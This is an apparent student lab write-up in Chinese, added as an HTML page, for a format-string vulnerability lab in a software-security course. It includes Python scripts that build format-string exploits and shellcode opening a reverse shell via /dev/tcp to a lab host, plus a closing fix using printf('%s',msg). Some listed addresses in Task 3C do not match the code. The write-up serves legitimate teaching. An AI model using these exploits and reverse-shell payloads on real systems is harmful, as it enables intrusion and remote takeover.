@@ -1,0 +1,518 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>LAB5 Format String · KYSIIN.ARCHIVE</title>
+<script src="../../../../assets/variant.js"></script>
+<link rel="stylesheet" href="../../../../assets/local-fonts.css" />
+<link rel="stylesheet" href="../../../../assets/endfield.css" />
+
+<style>
+  body { --tri-h: 3px; --topbar-h: 3.1rem; }
+  body > .ef-tri { position: sticky; top: 0; z-index: 61; }
+  .topbar { position:sticky; top:var(--tri-h); z-index:60;
+    display:flex; align-items:center; gap:1.5rem; padding:.85rem var(--ef-pad);
+    border-bottom:1px solid var(--ef-rule); background:var(--ef-panel); }
+  .topbar .brand { margin:0; font-family:var(--ef-font-ui); font-size:.95rem;
+    font-stretch:var(--ef-wider); font-weight:800; letter-spacing:.08em;
+    text-decoration:none; color:var(--ef-ink); }
+  .topbar nav { display:flex; align-items:center; gap:1.25rem; margin-left:auto; }
+  .topbar nav a { text-decoration:none; color:var(--ef-ink-2); }
+  .foot { display:flex; flex-wrap:wrap; align-items:baseline; justify-content:space-between;
+    gap:1rem; padding:1.5rem var(--ef-pad) 2.5rem; border-top:1px solid var(--ef-rule);
+    color:var(--ef-ink-2); font-size:.875rem; }
+  @media (max-width: 959px) { .ef-spread { grid-template-columns:minmax(0,1fr); }
+    .ef-sheet { border-right:0; border-bottom:1px solid var(--ef-rule); } }
+  @media (max-width:760px) { .topbar { flex-wrap:wrap; gap:.75rem; }
+    .topbar nav { order:3; width:100%; margin-left:0; } }
+
+  .title { margin:1.5rem 0 1rem; font-size:clamp(var(--ef-t-title),5vw,var(--ef-t-h1));
+    font-weight:700; line-height:1.3; }
+  .ef-prose { margin-top:1.75rem; }
+  .ef-prose img { max-width:100%; height:auto; border:1px solid var(--ef-rule); background:#fff; }
+  .ef-prose table { width:100%; border-collapse:collapse; font-size:.9rem; }
+  .ef-prose th, .ef-prose td { border-bottom:1px solid var(--ef-rule); padding:.45rem .6rem; text-align:left; }
+  .ef-prose th { font-family:var(--ef-font-ui); font-stretch:var(--ef-wide); font-size:.8rem; }
+  /* 代码块：整块一个背景；块内的 code 不再带行内边框/内边距 */
+  .ef-prose pre { overflow:auto; margin:1rem 0; padding:.9rem 1rem;
+    background:var(--ef-chip); border-left:3px solid var(--ef-rule);
+    font-size:.85rem; line-height:1.6; tab-size:4; }
+  .ef-prose pre code { display:block; padding:0; border:0; background:none;
+    font-family:var(--ef-font-mono); font-size:.85rem; line-height:1.6; white-space:pre; }
+  .ef-prose :not(pre) > code { font-family:var(--ef-font-mono); font-size:.88em;
+    padding:.1em .35em; border:1px solid var(--ef-rule); background:var(--ef-paper); }
+  .ef-prose blockquote { border-left:3px solid var(--ef-ink); margin:1rem 0; padding:.25rem 0 .25rem 1rem;
+    color:var(--ef-ink-2); }
+
+  /* —— 公式：绝不超出正文栏；行间公式可横向滚动 —— */
+  .ef-prose mjx-container { max-width:100%; }
+  .ef-prose mjx-container[display="true"] { display:block; text-align:center; margin:1.1em 0;
+    max-width:100%; overflow-x:auto; overflow-y:hidden; padding:2px 0; }
+  .ef-prose mjx-container[jax="CHTML"] { font-size:1.02em; }
+  .eq { overflow-x:auto; overflow-y:hidden; max-width:100%; padding:2px 0; }
+  .eq mjx-container[display="true"] { margin:.35em 0; }
+
+  .toc ol { margin:0; padding:0; list-style:none; border-left:1px solid var(--ef-rule); }
+  .toc a { display:block; margin-left:-1px; padding:.22rem 0 .22rem .7rem;
+    border-left:3px solid transparent; color:var(--ef-ink-2); font-size:.85rem;
+    overflow-wrap:anywhere; }
+  .toc a:hover { color:var(--ef-ink); border-left-color:var(--ef-trace); }
+  .toc .lvl3 { padding-left:1.3rem; font-size:.8rem; }
+  .back { margin:2rem 0 0; display:flex; flex-wrap:wrap; gap:.75rem; }
+
+  /* —— 三栏铺满：两侧栏贴边，中间正文吃掉所有剩余宽度 —— */
+  .ef-spread { max-width: none; margin: 0; }
+
+  @media (min-width: 1180px) {
+    .ef-spread.has-rail {
+      grid-template-columns: clamp(11rem, 12vw, 14rem) minmax(0, 1fr) clamp(13rem, 14vw, 17rem);
+      column-gap: clamp(.75rem, 1vw, 1.25rem);
+    }
+  }
+  @media (min-width: 960px) and (max-width: 1179px) {
+    .ef-spread.has-rail {
+      grid-template-columns: clamp(10rem, 12vw, 12rem) minmax(0, 1fr);
+      column-gap: clamp(.75rem, 1vw, 1.25rem);
+    }
+    .ef-spread.has-rail > .toc-aside { display: none; }
+  }
+  @media (min-width: 960px) {
+    .ef-spread > .ef-margin {
+      position: sticky;
+      top: calc(var(--tri-h) + var(--topbar-h));
+      align-self: start;
+      max-height: calc(100vh - var(--tri-h) - var(--topbar-h));
+      overflow-y: auto;
+      scrollbar-width: thin;
+      padding: clamp(1.5rem, 3vw, 2.5rem) 1rem;
+    }
+    /* 两侧栏往屏幕边缘靠，别在页边留空 */
+    .ef-spread > .rail-aside { padding-left: .75rem; padding-right: 1.25rem; }
+    .ef-spread > .toc-aside { padding-left: 1.25rem; padding-right: .75rem; }
+    /* 正文左右留呼吸，但不限制宽度 */
+    .ef-spread > .ef-sheet { padding-left: clamp(2rem, 3.5vw, 4rem); padding-right: clamp(2rem, 3.5vw, 4rem); }
+    /* 套件把正文限制在 40rem；中间栏变宽后这里放开，让文字铺满 */
+    .ef-sheet .ef-prose,
+    .ef-sheet .ef-lede,
+    .ef-sheet .title,
+    .ef-sheet .ef-read,
+    .ef-sheet .ef-facts,
+    .ef-sheet .ef-empty,
+    .ef-sheet .ef-notice { max-width: none; }
+  }
+  .ef-margin .toc a { font-size: .74rem; line-height: 1.5; }
+  .toc a[aria-current] { color: var(--ef-ink); border-left-color: var(--ef-trace); font-weight: 600; }
+  .rail-head { display: block; margin: 0 0 .5rem; padding-bottom: .35rem;
+    border-bottom: 1px solid var(--ef-rule); font-size: .68rem; line-height: 1.5; }
+  .rail-head span { display: inline; }
+  .rail-head span + span { display: block; color: var(--ef-ink-2); }
+  .rail-aside .toc a { padding-top: .3rem; padding-bottom: .3rem; }
+  .rail-tree { list-style:none; margin:0; padding:0; }
+  .rail-tree .tree-name { display:block; padding:.35rem .2rem .35rem .6rem;
+    border-left:3px solid transparent; font-size:.76rem; font-weight:600; color:var(--ef-ink); }
+  .rail-tree .tree-label { display:inline; }
+  .rail-tree .tree-name .ef-field { font-size:.68rem; color:var(--ef-ink-2); margin-left:.35rem;
+    white-space:nowrap; }
+  .rail-tree .tree-group.is-open > .tree-name { border-left-color:var(--ef-trace); }
+  .rail-tree .tree-items { list-style:none; margin:.1rem 0 .5rem; padding:0 0 0 .6rem;
+    border-left:1px solid var(--ef-rule); }
+  .rail-tree .tree-items a { padding-left:.6rem; font-size:.72rem; line-height:1.45; }
+  .tree-row { display:flex; align-items:stretch; gap:.15rem; }
+  .tree-row .tree-name { flex:1 1 auto; min-width:0; }
+  .tree-toggle { flex:none; width:1.55rem; min-height:1.9rem; display:grid; place-items:center;
+    padding:0; border:1px solid var(--ef-rule); background:var(--ef-panel); color:var(--ef-ink-2);
+    cursor:pointer; transition:color .12s var(--ef-ease), border-color .12s var(--ef-ease), background .12s var(--ef-ease); }
+  .tree-toggle:hover { color:var(--ef-ink); border-color:var(--ef-ink); background:var(--ef-chip); }
+  .tree-toggle svg { width:.7rem; height:.7rem; transition:transform .15s var(--ef-ease); }
+  .tree-toggle[aria-expanded="true"] svg { transform:rotate(90deg); }
+  .rail-tree .tree-items[hidden] { display:none; }
+  /* 滚动条统一样式在 assets/local-fonts.css 里定义（页面/侧栏/搜索共用） */
+
+  /* 窄屏：正文优先，两侧栏排到后面 */
+  @media (max-width: 959px) {
+    .ef-spread.has-rail > .ef-sheet { order: 1; }
+    .ef-spread.has-rail > .rail-aside { order: 2; border-top: 1px solid var(--ef-rule); }
+    .ef-spread.has-rail > .toc-aside { order: 3; }
+  }
+
+  /* —— 复习笔记：PDF 下载 —— */
+  .pdf-dl { display:flex; flex-wrap:wrap; align-items:center; gap:.75rem; margin:1.1rem 0 0; }
+  .pdf-dl .ef-btn { border-color:var(--ef-ink); }
+
+  /* —— 打印 / 导出 PDF：只留正文 —— */
+  @page { size:A4; margin:16mm 14mm 18mm; }
+  @media print {
+    html, body { background:#fff !important; }
+    .topbar, .foot, .ef-tri, .rail-aside, .toc-aside, .back, .pdf-dl,
+    .ef-crumb, .ef-eyebrow, .ef-facts, .ef-notice { display:none !important; }
+    .ef-spread, .ef-spread.has-rail { display:block !important; max-width:none !important; }
+    .ef-sheet { border:0 !important; padding:0 !important; background:#fff !important; }
+    .ef-sheet .ef-prose, .ef-sheet .ef-lede, .ef-sheet .title { max-width:none !important; }
+    .title { margin:0 0 1rem; }
+    /* 打印用系统字体：体积小、离线打开不依赖自托管字体 */
+    body, .ef-prose, .title, .ef-lede, .ef-facts,
+    h1, h2, h3, h4, h5, h6 { font-family:"Microsoft YaHei UI","Microsoft YaHei","PingFang SC",sans-serif !important; }
+    .ef-prose pre, .ef-prose code { font-family:Consolas,"Cascadia Mono",monospace !important; }
+    .ef-prose { margin-top:1rem; }
+    .ef-prose pre { white-space:pre-wrap; word-break:break-word; }
+    .ef-prose pre code { white-space:pre-wrap; }
+    .ef-prose img, .ef-prose svg, mjx-container { max-width:100% !important; }
+    a { color:inherit !important; text-decoration:none !important; }
+    .ef-prose h2, .ef-prose h3 { break-after:avoid; }
+    .ef-prose pre, .ef-prose table, .eq { break-inside:avoid; }
+  }
+
+</style>
+</head>
+<body class="ef ef-contours">
+<div class="ef-tri" aria-hidden="true"><i></i><i></i><i></i></div>
+<header class="topbar">
+  <a class="brand" href="../../../../index.html">KYSIIN.ARCHIVE</a>
+  <nav class="ef-field" aria-label="主导航">
+    <a href="../../../../index.html">首页</a>
+    <a href="../../index.html" aria-current="page">软件安全原理与实践</a>
+  </nav>
+  <span data-search-slot></span>
+  <button class="ef-btn small" type="button" data-theme-toggle>切换深浅</button>
+</header>
+
+<article class="ef-spread has-rail">
+  <aside class="ef-margin rail-aside" aria-label="本课程分区">
+    <div class="toc">
+      <p class="rail-head ef-field"><span>软件安全原理与实践</span><span>1 区</span></p>
+      <ol class="rail-tree">
+        <li class="tree-group is-open">
+          <div class="tree-row">
+            <a class="tree-name" href="../../index.html#sec-%E5%AE%9E%E9%AA%8C"><span class="tree-label">实验</span><span class="ef-field">7</span></a>
+            <button class="tree-toggle" type="button" aria-expanded="true" aria-label="收起 实验"><svg viewBox="0 0 12 12" aria-hidden="true"><path d="M4 2 L9 6 L4 10" fill="none" stroke="currentColor" stroke-width="1.6"/></svg></button>
+          </div>
+          <ol class="tree-items">
+            <li><a href="../LAB1_SET_UID/Lab1 Set-UID.html">Lab1 Set-UID</a></li>
+            <li><a href="../LAB2/LAB2 STACK OVERFLOW.html">LAB2 STACK OVERFLOW</a></li>
+            <li><a href="../LAB3/Lab3 Race Condition.html">Lab3 Race Condition</a></li>
+            <li><a href="../LAB4/Lab4 Spectre Attack and Meltdown Attack.html">Lab4 Spectre Attack and Meltdown Attack</a></li>
+            <li><a href="Lab5 Format String.html" aria-current="page">LAB5 Format String</a></li>
+            <li><a href="../LAB6/LAB6.html">LAB6 XSS</a></li>
+            <li><a href="../LAB7/LAB7.html">LAB7</a></li>
+          </ol>
+        </li>
+      </ol>
+      <p class="ef-actions" style="margin:.9rem 0 0">
+        <a class="ef-btn small" href="../../index.html">返回课程</a>
+      </p>
+    </div>
+  </aside>
+  <div class="ef-sheet">
+    <p class="ef-eyebrow slash">Course / Article</p>
+    <p class="ef-crumb ef-field"><a href="../../../../index.html">首页</a><a href="../../index.html">软件安全原理与实践</a><span>实验</span><span>LAB5</span></p>
+    <ul class="ef-facts ef-field">
+      <li>实验</li>
+      <li>1,415 字</li>
+      <li>2026.11.15</li>
+      <li>17 个小节</li>
+    </ul>
+    <h1 class="title ef-read">LAB5 Format String</h1>
+    <div class="ef-tri" aria-hidden="true"><i></i><i></i><i></i></div>
+    
+    
+    <div class="ef-prose">
+<h2 id="环境设置">环境设置</h2>
+<h3 id="关闭安全策略">关闭安全策略</h3>
+<p><img alt="" src="attachments/Pasted image 20261029031903.png" /></p>
+<h3 id="易受攻击的程序">易受攻击的程序</h3>
+<p><img alt="" src="attachments/Pasted image 20261029032055.png" /></p>
+<h3 id="建立容器">建立容器</h3>
+<p><img alt="" src="attachments/Pasted image 20261029032247.png" /></p>
+<h2 id="任务-一">任务 一</h2>
+<p><img alt="" src="attachments/Pasted image 20261029032358.png" /></p>
+<p>输入
+<code>echo %s%s%s%s%s%s%s | nc 10.9.0.5 9090</code>并<code>Ctrl+C</code>后使程序崩溃</p>
+<p><img alt="" src="attachments/Pasted image 20261029033234.png" /></p>
+<h2 id="任务-二">任务 二</h2>
+<h3 id="a-栈数据">A 栈数据</h3>
+<p>构建64个<code>%x</code>的<code>badfile</code>输入
+<img alt="" src="attachments/Pasted image 20261029040115.png" />
+可以看到<code>0xbfffeeee</code>在第64个出现，因此需要64个<code>%x</code></p>
+<h3 id="b-堆数据">B 堆数据</h3>
+<p>秘密数据地址是<code>0x080b4008</code>
+修改构建<code>number</code>为秘密地址，并把第64个<code>%x</code>改为<code>%s</code>
+得到秘密数据
+<img alt="" src="attachments/Pasted image 20261029040306.png" /></p>
+<h2 id="任务-三">任务 三</h2>
+<h3 id="a">A</h3>
+<p>target的地址是<code>0x080e5068</code>
+把target地址放在buffer的第1000位，随后前面放很多个%x，随后逐渐减少%x的个数
+<img alt="" src="attachments/Pasted image 20261029041611.png" />
+测得314个%x可以刚好读到target地址
+因此构建313个%x和1个%n
+<img alt="" src="attachments/Pasted image 20261029043901.png" />
+成功修改target</p>
+<h3 id="b">B</h3>
+<p>0x062d比0x5000少0x49d3（18899），因此多输出18899个字符就行，用%0.18890x实现
+<img alt="" src="attachments/Pasted image 20261029044926.png" /></p>
+<h3 id="c">C</h3>
+<p>将修改拆分为aa bb cc dd，使用%hhn实现
+四个地址分别为0x0805068/0x0805069/0x080506a/0x0805068b</p>
+<pre><code class="language-PYTHON">#!/usr/bin/python3
+import sys
+
+# Initialize the content array
+N = 1500
+content = bytearray(0x0 for i in range(N))
+
+# This line shows how to store a 4-byte integer at offset 0
+number1  = 0x080e506b
+content[1000:1004]  =  (number1).to_bytes(4,byteorder='little')
+number2  = 0x080e506a
+content[1008:1012]  =  (number2).to_bytes(4,byteorder='little')
+number3  = 0x080e5069
+content[1016:1020]  =  (number3).to_bytes(4,byteorder='little')
+number4  = 0x080e5068
+content[1024:1028]  =  (number4).to_bytes(4,byteorder='little')
+
+# This line shows how to construct a string s with
+#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;
+s = &quot;%x&quot; * 312 + &quot;%326d&quot; + &quot;%hhn&quot; + &quot;%273d&quot; + &quot;%hhn&quot; + &quot;%273d&quot; + &quot;%hhn&quot; + &quot;%273d&quot; + &quot;%hhn&quot;
+
+# The line shows how to store the string s at offset 8
+fmt  = (s).encode('latin-1')
+content[0:len(fmt)] = fmt
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  f.write(content)
+</code></pre>
+<p><img alt="" src="attachments/Pasted image 20261029051522.png" />
+修改成功</p>
+<h2 id="任务-四">任务 四</h2>
+<h3 id="1-理解栈布局">1 理解栈布局</h3>
+<blockquote>
+<p>问题1</p>
+</blockquote>
+<p>②是函数<code>myprintf</code>的返回地址，地址应为<code>frame pointer+4 = 0xffffd37c</code>③是<code>buf</code>的起始地址，可以从服务器输出直接获得：<code>0xffffd450</code></p>
+<blockquote>
+<p>问题2</p>
+</blockquote>
+<p>64个</p>
+<h3 id="2-shellcode">2 Shellcode</h3>
+<p>0xffffd450+1200=0xffffd900
+<code>s = "%x" * (312) + "%335d" + "%hhn" + "%256d" + "%hhn" + "%218d" + "%hhn" + "%39d" + "%hhn"</code></p>
+<pre><code class="language-PYTHON">#!/usr/bin/python3
+import sys
+
+# 32-bit Generic Shellcode
+shellcode_32 = (
+   &quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;
+   &quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;
+   &quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;
+   &quot;/bin/bash*&quot;
+   &quot;-c*&quot;
+   # The * in this line serves as the position marker         *
+   &quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;
+   &quot;AAAA&quot;   # Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;
+   &quot;BBBB&quot;   # Placeholder for argv[1] --&gt; &quot;-c&quot;
+   &quot;CCCC&quot;   # Placeholder for argv[2] --&gt; the command string
+   &quot;DDDD&quot;   # Placeholder for argv[3] --&gt; NULL
+).encode('latin-1')
+
+
+# 64-bit Generic Shellcode
+shellcode_64 = (
+   &quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;
+   &quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;
+   &quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;
+   &quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;
+   &quot;/bin/bash*&quot;
+   &quot;-c*&quot;
+   # The * in this line serves as the position marker         *
+   &quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;
+   &quot;AAAAAAAA&quot;   # Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;
+   &quot;BBBBBBBB&quot;   # Placeholder for argv[1] --&gt; &quot;-c&quot;
+   &quot;CCCCCCCC&quot;   # Placeholder for argv[2] --&gt; the command string
+   &quot;DDDDDDDD&quot;   # Placeholder for argv[3] --&gt; NULL
+).encode('latin-1')
+
+N = 1500
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(N))
+
+# Choose the shellcode version based on your target
+shellcode = shellcode_32
+
+# Put the shellcode somewhere in the payload
+start = 1200               # Change this number
+content[start:start + len(shellcode)] = shellcode
+s = &quot;%x&quot; * (312) + &quot;%335d&quot; + &quot;%hhn&quot; + &quot;%256d&quot; + &quot;%hhn&quot; + &quot;%218d&quot; + &quot;%hhn&quot; + &quot;%39d&quot; + &quot;%hhn&quot;
+fmt = (s).encode('latin-1')
+content[0:len(fmt)] = fmt
+
+# ebp at 0xffffd378, return at 0xffffd37c
+addr1 = 0xffffd37f
+content[1000:1004] = (addr1).to_bytes(4,byteorder='little')
+addr2 = 0xffffd37e
+content[1008:1012] = (addr2).to_bytes(4,byteorder='little')
+addr3 = 0xffffd37d
+content[1016:1020] = (addr3).to_bytes(4,byteorder='little')
+addr4 = 0xffffd37c
+content[1024:1028] = (addr4).to_bytes(4,byteorder='little')
+# Save the format string to file
+with open('badfile', 'wb') as f:
+  f.write(content)
+
+</code></pre>
+<p><img alt="" src="attachments/Pasted image 20261029062147.png" />
+成功</p>
+<h2 id="任务-5">任务 5</h2>
+<p>获得地址
+<img alt="" src="attachments/Pasted image 20261029062355.png" />
+先检测target在哪里
+<img alt="" src="attachments/Pasted image 20261029064142.png" />
+159个%p刚好输出
+返回地址0x00007fffffffe380 + 1200 = 0x00007fffffffe830
+这个地址被存在0x00007fffffffe2c0+8=0x00007fffffffe2c8</p>
+<pre><code class="language-python">#!/usr/bin/python3
+import sys
+
+shellcode_64 = (
+   &quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;
+   &quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;
+   &quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;
+   &quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;
+   &quot;/bin/bash*&quot;
+   &quot;-c*&quot;
+   # The * in this line serves as the position marker         *
+   &quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;
+   &quot;AAAAAAAA&quot;   # Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;
+   &quot;BBBBBBBB&quot;   # Placeholder for argv[1] --&gt; &quot;-c&quot;
+   &quot;CCCCCCCC&quot;   # Placeholder for argv[2] --&gt; the command string
+   &quot;DDDDDDDD&quot;   # Placeholder for argv[3] --&gt; NULL
+).encode('latin-1')
+
+N = 1500
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(N))
+
+# Choose the shellcode version based on your target
+shellcode = shellcode_64
+
+# Put the shellcode somewhere in the payload
+start = 1200               # Change this number
+content[start:start + len(shellcode)] = shellcode
+# 0x00007fffffffe380 + 1200 = 0x00007fffffffe830
+s = &quot;%p&quot;*(159 - 2) + &quot;%174lld&quot;+&quot;%hhn&quot;+&quot;%128lld&quot;+&quot;%hhn&quot;+&quot;%256lld&quot;+&quot;%hhn&quot;+&quot;%256lld&quot;+&quot;%hhn&quot;+&quot;%233lld&quot;+&quot;%hhn&quot;+&quot;%72lld&quot;+&quot;%hhn&quot;
+fmt = (s).encode('latin-1')
+content[0:len(fmt)] = fmt
+
+# %rsp at 0x00007fffffffe2c0; return address at 0x00007fffffffe2c8
+addr1 = 0x00007fffffffe2cd
+content[1000:1008] = (addr1).to_bytes(8,byteorder='little')
+addr2 = 0x00007fffffffe2cc
+content[1016:1024] = (addr2).to_bytes(8,byteorder='little')
+addr3 = 0x00007fffffffe2cb
+content[1032:1040] = (addr3).to_bytes(8,byteorder='little')
+addr4 = 0x00007fffffffe2ca
+content[1048:1056] = (addr4).to_bytes(8,byteorder='little')
+addr5 = 0x00007fffffffe2c9
+content[1064:1072] = (addr5).to_bytes(8,byteorder='little')
+addr6 = 0x00007fffffffe2c8
+content[1080:1088] = (addr6).to_bytes(8,byteorder='little')
+
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  f.write(content)
+
+</code></pre>
+<p><img alt="" src="attachments/Pasted image 20261029064628.png" />
+成功</p>
+<h2 id="任务-六">任务 六</h2>
+<p><img alt="" src="attachments/Pasted image 20261029032055.png" />
+将变量 <code>msg</code> 直接作为 <code>printf</code> 的格式字符串，而不是当作普通输出内容。这意味着一旦 <code>msg</code> 中包含 <code>%n</code>、<code>%s</code> 等格式符，程序就会错误地将其解释为指令去读取或写入内存，从而引发崩溃或代码执行。
+修改为<code>printf("%s",msg);</code>
+编译后不报错，攻击也不生效。
+<img alt="" src="attachments/Pasted image 20261029065002.png" /></p>
+    </div>
+    <p class="back"><a class="ef-btn" href="../LAB4/Lab4 Spectre Attack and Meltdown Attack.html">← Lab4 Spectre Attack and </a> <a class="ef-btn" href="../LAB6/LAB6.html">LAB6 XSS →</a> <a class="ef-btn" href="../../index.html">返回本课</a></p>
+  </div>
+  <aside class="ef-margin toc-aside" aria-label="本页目录">
+    <div class="toc">
+      <p class="rail-head ef-field"><span>本页目录</span><span>17 节</span></p>
+      <ol>
+      <li><a class="lvl2" href="#环境设置">环境设置</a></li>
+      <li><a class="lvl3" href="#关闭安全策略">关闭安全策略</a></li>
+      <li><a class="lvl3" href="#易受攻击的程序">易受攻击的程序</a></li>
+      <li><a class="lvl3" href="#建立容器">建立容器</a></li>
+      <li><a class="lvl2" href="#任务-一">任务 一</a></li>
+      <li><a class="lvl2" href="#任务-二">任务 二</a></li>
+      <li><a class="lvl3" href="#a-栈数据">A 栈数据</a></li>
+      <li><a class="lvl3" href="#b-堆数据">B 堆数据</a></li>
+      <li><a class="lvl2" href="#任务-三">任务 三</a></li>
+      <li><a class="lvl3" href="#a">A</a></li>
+      <li><a class="lvl3" href="#b">B</a></li>
+      <li><a class="lvl3" href="#c">C</a></li>
+      <li><a class="lvl2" href="#任务-四">任务 四</a></li>
+      <li><a class="lvl3" href="#1-理解栈布局">1 理解栈布局</a></li>
+      <li><a class="lvl3" href="#2-shellcode">2 Shellcode</a></li>
+      <li><a class="lvl2" href="#任务-5">任务 5</a></li>
+      <li><a class="lvl2" href="#任务-六">任务 六</a></li>
+      </ol>
+    </div>
+  </aside>
+</article>
+
+<footer class="foot">
+  <span class="ef-field">KYSIIN.ARCHIVE · 2026.11.15 · 由 Markdown 渲染</span>
+  <span>用 endfield-ui 渲染 · Saira（SIL OFL）自托管</span>
+</footer>
+<script type="module">
+  import { wireTheme } from '../../../../assets/fx.js'
+  wireTheme()
+</script>
+<script defer src="../../../../assets/search.js?v=202611150558"></script>
+<script>
+  /* 左栏：每个分组可独立展开/收起 */
+  (function () {
+    document.querySelectorAll('.tree-toggle').forEach(function (btn) {
+      btn.addEventListener('click', function (e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var li = btn.closest('.tree-group');
+        var list = li ? li.querySelector('.tree-items') : null;
+        var open = btn.getAttribute('aria-expanded') === 'true';
+        btn.setAttribute('aria-expanded', String(!open));
+        if (list) list.hidden = open;
+        if (li) li.classList.toggle('is-open', !open);
+      });
+    });
+  })();
+</script>
+<script>
+  /* 右栏目录跟随滚动：读到哪一节就把那一行标出来 */
+  (function () {
+    var links = [].slice.call(document.querySelectorAll('.toc-aside a[href^="#"]'));
+    if (!links.length) return;
+    var items = links.map(function (a) {
+      var el = document.getElementById(a.getAttribute('href').slice(1));
+      return el ? { a: a, el: el } : null;
+    }).filter(Boolean);
+    if (!items.length) return;
+    var ticking = false;
+    function spy() {
+      ticking = false;
+      var line = window.scrollY + 140;
+      var best = null;
+      for (var i = 0; i < items.length; i++) {
+        if (items[i].el.getBoundingClientRect().top + window.scrollY <= line) best = items[i];
+      }
+      links.forEach(function (a) { a.removeAttribute('aria-current'); });
+      if (best) best.a.setAttribute('aria-current', 'true');
+    }
+    window.addEventListener('scroll', function () {
+      if (!ticking) { ticking = true; requestAnimationFrame(spy); }
+    }, { passive: true });
+    spy();
+  })();
+</script>
+</body>
+</html>
